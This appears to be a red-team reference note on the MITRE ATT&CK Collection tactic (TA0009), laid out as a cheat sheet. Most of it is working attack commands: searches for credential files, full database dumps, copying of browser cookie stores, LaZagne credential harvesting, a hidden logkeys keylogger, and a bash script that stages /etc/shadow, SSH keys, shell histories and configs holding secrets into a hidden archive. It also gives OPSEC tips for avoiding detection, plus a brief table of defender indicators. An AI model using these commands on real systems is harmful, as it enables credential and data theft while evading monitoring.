---
type: tactic-hub
room: red
tactic: "Collection"
tactic_id: "TA0009"
tags: [red/collection, mitre/TA0009]
date_updated: {{date}}
---

# TA0009 — Collection

> [!quote]
> *"It is a capital mistake to theorize before one has data."*

**MITRE Reference:** [TA0009](https://attack.mitre.org/tactics/TA0009/) | **Kill Chain Phase:** Actions on Objectives

The adversary is trying to gather data of interest. Discovery maps the terrain. Collection harvests the prize — files, databases, emails, keystrokes, screenshots — everything worth stealing.

---

## Techniques in This Tactic

| Technique ID | Name |
|-------------|------|
| [[T1213 - Data from Information Repositories]] | SharePoint, Confluence, Databases |
| [[T1005 - Data from Local System]] | Files from local filesystem |
| [[T1039 - Data from Network Shared Drive]] | SMB shares, NFS |
| [[T1025 - Data from Removable Media]] | USB drives |
| [[T1114 - Email Collection]] | Mailbox access |
| [[T1056 - Input Capture]] | Keylogging |
| [[T1113 - Screen Capture]] | Screenshots |
| [[T1185 - Browser Session Hijacking]] | Steal cookies/session tokens |
| [[T1119 - Automated Collection]] | Scripts to bulk-collect |

---

## Standard Collection Workflows

### Local File System (T1005)
```bash
# Find high-value files (Linux)
find / -name "*.kdbx" -o -name "*.db" -o -name "*.sqlite" -o -name "*.csv" -o -name "*.xlsx" 2>/dev/null
find /home -name "*.ssh" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" | xargs grep -l "password\|secret\|token\|key" 2>/dev/null

# Windows — find interesting files
where /r C:\ *.kdbx *.rdg *.vnc *.ppk *.key 2>nul
findstr /si "password" C:\Users\*.txt C:\Users\*.xml
```

### Database Collection (T1213)
```bash
# MySQL — dump all databases
mysqldump -u root -p --all-databases > all-dbs.sql

# PostgreSQL
pg_dumpall -U postgres > all-dbs.sql

# SQLite
sqlite3 /path/to/db.sqlite ".dump" > dump.sql

# MSSQL (via sqlcmd or mssqlclient)
mssqlclient.py <user>:<pass>@<target>
# In session:
SELECT name FROM master.dbo.sysdatabases;
SELECT table_name FROM information_schema.tables;
SELECT * FROM users;
```

### Email Collection (T1114)
```bash
# Exchange via EWS (impacket)
exchangelib-dump.py -u <user> -p <pass> -d <domain> -m <mailbox>

# Outlook PST from filesystem
# Windows: %APPDATA%\Microsoft\Outlook\*.pst
# Copy PST file and open locally

# Web-based mail — steal session cookie and replay in browser
```

### Screenshot & Screen Capture (T1113)
```bash
# Linux (X11)
scrot /tmp/screenshot.png
import -window root /tmp/screenshot.png  # ImageMagick

# Windows (PowerShell)
Add-Type -AssemblyName System.Windows.Forms
$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
$bmp.Save("C:\Temp\screenshot.png")
```

### Browser Data Collection (T1185)
```bash
# LaZagne — collect all browser credentials
.\lazagne.exe browsers

# Chrome cookies (SQLite)
copy "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies" C:\Temp\
# Parse with tools like SharpChromium or manually with sqlite3

# Firefox profiles
copy "C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite" C:\Temp\
```

### Keylogging (T1056.001)
```bash
# Linux keylogger (requires root)
apt install logkeys
logkeys --start --output /tmp/.kl.log

# Windows (PowerShell — simple hook)
# Use a compiled keylogger or Meterpreter keylog module
# In Meterpreter: keyscan_start; keyscan_dump; keyscan_stop
```

### Automated Collection Script
```bash
#!/bin/bash
# Quick collection script — adjust targets
LOOT="/tmp/.loot_$(hostname)"
mkdir -p "$LOOT"

# Credentials files
cp /etc/passwd /etc/shadow /etc/sudoers "$LOOT/" 2>/dev/null

# SSH keys
find /home /root -name "id_rsa" -o -name "authorized_keys" 2>/dev/null | \
  xargs -I{} cp {} "$LOOT/" 2>/dev/null

# Bash histories
find /home /root -name ".bash_history" 2>/dev/null | \
  xargs -I{} sh -c 'cp {} "$LOOT/$(dirname {}|tr / _).bash_history"' 2>/dev/null

# Interesting configs
find / -name "*.conf" -o -name "*.env" -o -name "wp-config.php" 2>/dev/null | \
  xargs grep -l "password\|secret" 2>/dev/null | \
  xargs -I{} cp {} "$LOOT/" 2>/dev/null

tar czf "/tmp/.loot.tgz" "$LOOT"
echo "Staged at /tmp/.loot.tgz"
```

---

## OPSEC Considerations

> [!warning] Volume and Access Patterns
> - Accessing thousands of files rapidly triggers DLP and UEBA alerts.
> - Keyloggers on EDR-protected hosts are often caught by hook detection.
> - DB dumps generate large outbound queries — space them out.
> - Screenshot tools may trigger AV if binary-based — use native OS methods.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| Mass file access | Security (4663) | High-volume file opens |
| DB dump | DB audit log | SELECT * or mysqldump sessions |
| Browser data access | Sysmon (1) | Process accessing Chrome/Firefox paths |
| Keylogger | EDR | Hook installation in keyboard chain |

---

## Related Notes

- [[TA0007 - Discovery]] ← Know what to collect first
- [[TA0010 - Exfiltration]] ← Move it out after staging

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
